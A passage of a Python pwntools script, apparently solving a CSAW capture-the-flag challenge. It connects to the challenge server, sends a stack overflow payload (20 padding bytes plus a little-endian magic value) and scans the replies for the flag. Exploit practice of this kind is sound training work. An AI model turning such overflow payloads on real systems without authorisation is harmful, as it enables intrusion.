    # Connect to the remote server
    conn = remote('pwn.chal.csaw.io', 1436)

    # Create payload: 20 bytes padding + 0xcaf3b0ee in little endian
    payload = b'A' * 20 + p32(0xcaf3b0ee)

    # Send the payload after receiving prompt
    banner = conn.recvuntil(b'??', timeout=2)
    print("Banner received:", banner)

    conn.send(payload)

    # Try to receive any output
    try:
        while True:
            data = conn.recv(timeout=1)
            if not data:
                break
            print("Received:", data)
            if b'flag{' in data:
                print("Found flag:", data)
                return True
    except EOFError:
        print("Connection closed by remote host")
    except Exception as e:
        print("Error:", e)
    finally:
        conn.close()
    return False

